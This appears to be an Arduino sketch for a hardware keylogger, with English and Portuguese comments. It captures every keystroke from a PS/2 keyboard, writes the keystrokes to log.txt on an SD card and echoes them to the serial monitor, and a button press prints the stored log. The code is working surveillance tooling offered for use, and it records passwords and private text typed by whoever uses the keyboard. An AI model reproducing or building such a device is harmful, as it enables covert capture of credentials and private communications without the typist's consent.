#include <stdlib.h>
#include <PS2Keyboard.h>
#include <SPI.h>
#include <SD.h>

PS2Keyboard keyboard; //Initializing PS2Keyboard as just keyboard | Iniciando PS2Keyboard como keyboard.
File myFile; //Output file defined as myFile | Arquivo de saída definido como myFile.

// Assigning pin numbers to variables | Atribuindo os números dos pinos para variáveis.
const int Btn = 6;
const int Led = 7;
const int DataPin = 2;
const int IRQpin =  3;
const int CS = 4;

char c = 'a';

// Void function to print keylogger's log to the serial monitor | Função sem saída que imprime o log do Keylogger no monitor serial.
 void getLogs(){

 myFile = SD.open("log.txt");

  if (myFile) {
    Serial.println("log.txt:");

    while (myFile.available()) {
      Serial.write(myFile.read());

    }
    myFile.close();

  } else {
    Serial.println("error opening log.txt");

  }
 }

//Arduino's setup function | Função de configuração do arduino
void setup() { 
  Serial.begin(9600);
  pinMode(CS, OUTPUT);
  pinMode(Led, OUTPUT);
  pinMode(Btn, INPUT);

  keyboard.begin(DataPin, IRQpin);
  Serial.println("Keylogger Started!");
  Serial.println("Initializing SD Card...");

  if (!SD.begin(CS)) 
  {
    Serial.println("Failed to initialize SD Card! Please verify!");
    return;
  }
  Serial.println("Initialization Completed!");
  delay(1000);
}

//main function of keylogger | Função principal do Keylogger
void loop() { 

  if(digitalRead(Btn)==LOW){
    getLogs();
    }

  if (keyboard.available()) {

    digitalWrite(Led, HIGH);

    c = keyboard.read();

    if(keyboard.read()){
        
        if (c == PS2_ENTER) {
          Serial.println();
          myFile = SD.open("log.txt", FILE_WRITE);
          myFile.println(c);
          myFile.close();
        } else if (c == PS2_TAB) {
          Serial.print("[Tab]");
        } else if (c == PS2_ESC) {
          Serial.print("[ESC]");
        } else if (c == PS2_PAGEDOWN) {
          Serial.print("[PgDn]");
        } else if (c == PS2_PAGEUP) {
          Serial.print("[PgUp]");
        } else if (c == PS2_LEFTARROW) {
          Serial.print("[Left]");
        } else if (c == PS2_RIGHTARROW) {
          Serial.print("[Right]");
        } else if (c == PS2_UPARROW) {
          Serial.print("[Up]");
        } else if (c == PS2_DOWNARROW) {
          Serial.print("[Down]");
        } else if (c == PS2_DELETE) {
          Serial.print("[Del]");
        } else {

      Serial.print(c);
  }

   myFile = SD.open("log.txt", FILE_WRITE);
   myFile.print(c);
   myFile.close();
  }

  digitalWrite(Led, LOW); //Visual feedback | Retorno visual 
  }
}